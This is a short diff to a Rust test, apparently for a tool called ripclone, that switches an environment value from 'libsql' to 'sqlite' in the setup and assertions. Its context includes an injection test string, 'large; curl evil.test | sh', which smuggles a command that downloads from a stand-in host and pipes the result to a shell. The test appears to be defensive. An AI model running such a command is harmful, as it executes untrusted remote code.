@@ -216,7 +216,7 @@ done
 
         let nasty = "large; curl evil.test | sh";
         let mut env = BTreeMap::new();
-        env.insert("RIPCLONE_QUEUE".into(), "libsql".into());
+        env.insert("RIPCLONE_QUEUE".into(), "sqlite".into());
         env.insert("RIPCLONE_TOKEN".into(), "secret-token".into());
 
         provider
@@ -233,7 +233,7 @@ done
                 .unwrap_or(false);
             let env_ready = std::fs::read_to_string(&env_out)
                 .map(|contents| {
-                    contents.contains("RIPCLONE_QUEUE=libsql")
+                    contents.contains("RIPCLONE_QUEUE=sqlite")
                         && contents.contains("RIPCLONE_TOKEN=secret-token")
                 })
                 .unwrap_or(false);
@@ -253,7 +253,7 @@ done
         );
 
         let env_recorded = std::fs::read_to_string(env_out).unwrap();
-        assert!(env_recorded.contains("RIPCLONE_QUEUE=libsql"));
+        assert!(env_recorded.contains("RIPCLONE_QUEUE=sqlite"));
         assert!(env_recorded.contains("RIPCLONE_TOKEN=secret-token"));
     }
 
